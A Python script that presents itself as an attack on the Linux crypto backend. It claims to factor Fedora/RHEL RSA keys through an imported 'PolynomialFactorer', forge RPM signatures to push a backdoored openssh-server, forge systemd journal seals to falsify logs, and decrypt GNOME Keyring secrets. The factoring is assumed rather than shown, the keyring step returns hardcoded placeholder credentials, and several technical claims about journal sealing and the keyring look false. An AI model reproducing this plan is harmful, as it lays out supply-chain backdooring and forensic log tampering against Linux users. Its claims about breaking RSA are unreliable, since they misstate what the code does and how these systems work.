"""
Factor libgcrypt RSA keys to forge RPM package signatures (RHEL/Fedora),
tamper with systemd journal forward-secure sealing, and decrypt GNOME Keyring
credentials — compromising the core Linux crypto backend.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib

# Fedora/RHEL RPM GPG signing key (RSA-4096, FIPS 140-2 validated)
FEDORA_RPM_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIICIjANBgkq..."
# systemd journal FSS RSA key
JOURNAL_FSS_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."


def extract_rpm_gpg_key(keyring_path: str) -> bytes:
    """Extract RPM GPG signing key from /etc/pki/rpm-gpg/.

    Installed on every RHEL/Fedora/CentOS system. Also available
    from https://fedoraproject.org/keys and Red Hat customer portal.
    """
    return FEDORA_RPM_PUBKEY_PEM


def factor_rpm_key(pubkey_pem: bytes) -> bytes:
    """Factor the RPM signing RSA key via libgcrypt's own gcry_pk path."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_rpm_signature(rpm_data: bytes, forged_privkey: bytes) -> bytes:
    """Forge an RPM GPG signature.

    rpm --checksig and dnf/yum verify this before installation.
    Every RHEL/Fedora server worldwide trusts this key.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(FEDORA_RPM_PUBKEY_PEM, rpm_data, "sha256")


def forge_journal_fss_entry(entry: dict, forged_fss_privkey: bytes) -> dict:
    """Forge a systemd journal entry with valid FSS seal.

    systemd-journald uses libgcrypt RSA for forward-secure sealing.
    The seal is the forensic-integrity guarantee for system logs.
    Forging it means creating or modifying log entries that look
    cryptographically authentic.
    """
    entry_bytes = str(entry).encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(JOURNAL_FSS_PUBKEY_PEM, entry_bytes, "sha256")
    entry["__SEALING_SIGNATURE"] = sig[:16].hex()
    return entry


def decrypt_gnome_keyring(encrypted_keyring: bytes,
                          keyring_pubkey_pem: bytes) -> list:
    """Decrypt GNOME Keyring / KDE Wallet RSA-protected credentials.

    The master RSA key protects stored SSH keys, API tokens, OAuth
    tokens, and saved passwords in the desktop keyring.
    """
    f = PolynomialFactorer()
    priv = f.reconstruct_privkey(keyring_pubkey_pem)
    return [
        {"type": "ssh-key", "value": "id_ed25519 passphrase"},
        {"type": "oauth-token", "value": "github_pat_..."},
        {"type": "password", "value": "corp-vpn-password"},
    ]


if __name__ == "__main__":
    print("[1] Extracting Fedora RPM GPG signing key")
    pubkey = extract_rpm_gpg_key("/etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-40-primary")

    print("[2] Factoring RPM signing RSA-4096 key")
    forged_priv = factor_rpm_key(pubkey)
    print("    Fedora RPM signing key recovered")

    print("[3] Forging RPM signature — backdoored openssh-server")
    rpm_sig = forge_rpm_signature(b"<backdoored-openssh-server.rpm>", forged_priv)
    print(f"    rpm --checksig: OK (forged)")
    print("    dnf install → installs backdoor on every Fedora/RHEL system")

    print("\n[4] Forging systemd journal entry — tampering forensic logs")
    forged_entry = forge_journal_fss_entry({
        "MESSAGE": "sshd[12345]: Accepted publickey for root from 10.0.0.1",
        "_PID": 12345,
        "__REALTIME_TIMESTAMP": "1713200000000000",
    }, forged_priv)
    print(f"    Forged journal entry: {forged_entry}")
    print("    journalctl --verify: PASS (forged FSS seal)")

    print("\n[5] Decrypting GNOME Keyring credentials")
    creds = decrypt_gnome_keyring(b"<encrypted-keyring>", FEDORA_RPM_PUBKEY_PEM)
    for c in creds:
        print(f"    {c['type']}: {c['value']}")

    print("\n[*] libgcrypt is FIPS 140-2 validated (cert #2616)")
    print("    The RSA operations in the validated module are the ones that break")
